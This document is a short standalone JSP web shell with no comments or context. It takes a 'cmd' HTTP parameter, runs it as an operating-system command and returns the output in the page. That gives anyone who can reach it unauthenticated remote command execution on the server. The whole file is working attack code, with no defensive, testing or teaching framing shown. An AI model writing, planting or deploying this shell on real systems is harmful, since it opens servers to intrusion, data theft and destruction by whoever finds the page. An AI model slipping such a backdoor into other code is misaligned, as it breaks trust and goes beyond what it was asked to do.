<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    BufferedReader br = new BufferedReader(
      new InputStreamReader(p.getInputStream())
    );
    String line;
    while ((line = br.readLine()) != null) {
      out.println(line + "<br>");
    }
  } else {
    out.println("no cmd");
  }
%>
